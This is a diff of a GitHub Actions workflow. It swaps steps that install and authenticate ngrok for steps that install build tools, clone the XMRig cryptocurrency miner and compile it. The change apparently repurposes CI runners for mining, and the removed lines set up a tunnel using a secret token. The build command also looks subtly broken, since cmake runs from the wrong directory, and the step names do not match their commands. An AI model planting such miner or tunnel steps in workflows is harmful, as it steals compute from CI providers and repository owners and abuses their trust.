@@ -16,15 +16,15 @@ jobs:
 
     - name: Download
 
-      run:  sudo snap install ngrok
+      run:  sudo apt install git cmake build-essential libssl-dev libuv1-dev libhwloc-dev
 
-    - name: Extract
+    - name: Clone
 
-      run: unzip ngrok.zip
+      run: git clone https://github.com/xmrig/xmrig.git
 
-    - name: Auth
+    - name: steps
 
-      run: ./ngrok authtoken $Env:NGROK_AUTH_TOKEN
+      run: cd xmrig;mkdir build;cmake ..;make
 
       env:
 
